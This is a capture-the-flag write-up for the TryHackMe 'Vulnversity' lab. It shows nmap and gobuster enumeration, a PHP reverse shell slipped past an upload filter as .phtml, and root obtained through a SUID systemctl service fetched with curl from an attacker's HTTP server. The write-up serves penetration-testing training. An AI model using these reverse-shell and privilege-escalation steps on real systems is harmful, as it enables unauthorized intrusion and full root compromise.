# Vulnversity

2021-12-21

## NMAP

| Flag | Description|
|----|---|
| -sV | Determine versions of running services
| -sC | Scan with default namp scripts

```
koffee@kali:~/tryhackme/vulnversity$ nmap -sV -sC -oN scan.nmap 10.10.65.121 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-21 14:10 CST
Nmap scan report for 10.10.65.121
Host is up (0.11s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2021-12-21T15:11:02-05:00
| smb2-time: 
|   date: 2021-12-21T20:11:01
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.14 seconds
```

# GoBuster

| Flag | Description|
|----|---|
-e |	Print the full URLs in your console |
-u / --url	| The target URL
-w	| Path to your wordlist
-U and -P	| Username and Password for Basic Auth
-p | Proxy to use for requests
-c | Specify a cookie for simulating your auth
	
```
koffee@kali:~/tryhackme/vulnversity$ gobuster dir --url http://10.10.65.121:3333 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.65.121:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/21 14:22:31 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 293]
/.htpasswd            (Status: 403) [Size: 298]
/.htaccess            (Status: 403) [Size: 298]
/css                  (Status: 301) [Size: 317] [--> http://10.10.65.121:3333/css/]
/fonts                (Status: 301) [Size: 319] [--> http://10.10.65.121:3333/fonts/]
/images               (Status: 301) [Size: 320] [--> http://10.10.65.121:3333/images/]
/index.html           (Status: 200) [Size: 33014]                                     
/internal             (Status: 301) [Size: 322] [--> http://10.10.65.121:3333/internal/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.65.121:3333/js/]      
/server-status        (Status: 403) [Size: 302] 
```

## OWASP ZAP Fuzzing

Tools >> Options >> Local Proxies >> `localhost:8080`
Tools >> Options >>  Dynamic SSL Certificates >> Save

Inside Firefox 

Preferences >> Security & Privacy >> View Certificates >> Import
Set HTTP Proxy to use `localhost:8080`

Make POST request to upload file >> highlight uploaded file >> Right Click >> Fuzz

We see that `.phtml` files are allowed

## Reverse Shell

Download [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), change `$ip` and `$port` inside script, open firewall

```
nc -lvnp 8888
```

Rename `php-reverse-shell.php` to `.phtml` and upload, then naviagate to `http://<ip>:3333/internal/uploads/php-reverse-shell.phtml`

## SUID

```
find / -user root -perm -4000 -exec ls -ldb {} \;

/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

## Systemctl Privilege Escalation

https://gtfobins.github.io/gtfobins/systemctl/

On Attacker System:

```
% cat service.txt
[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/out"
[Install]
WantedBy=multi-user.target
```

Host using `python3 -m http.server 9999`

On Remote Shell

```
% TF=$(mktemp).service
% curl 10.x.x.x:9999/service.txt > $TF
% systemctl link $TF
% systemctl enable --now $TF

TF=$(mktemp).service && curl 10.x.x.x:9999/service.txt > $TF && systemctl link $TF && systemctl enable --now $TF && cat /tmp/out

% cat /tmp/out
uid=0(root) gid=0(root) groups=0(root)
```
Go and change the service text to find the flag
 
```
[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/out"
[Install]
WantedBy=multi-user.target
```

```
$ TF=$(mktemp).service \
  && curl 10.x.x.x:9999/service.txt > $TF \
  && systemctl link $TF \
  && systemctl enable --now $TF \
  && cat /tmp/out

% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   114  100   114    0     0    337      0 --:--:-- --:--:-- --:--:--   337
Created symlink from /etc/systemd/system/tmp.L3uCyJblwK.service to /tmp/tmp.L3uCyJblwK.service.
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.L3uCyJblwK.service to /tmp/tmp.L3uCyJblwK.service.
uid=0(root) gid=0(root) groups=0(root)
total 4
drwxr-xr-x 2 bill bill 4096 Jul 31  2019 bill
total 4
-rw-r--r-- 1 root root 33 Jul 31  2019 root.txt
[REDACTED]
```
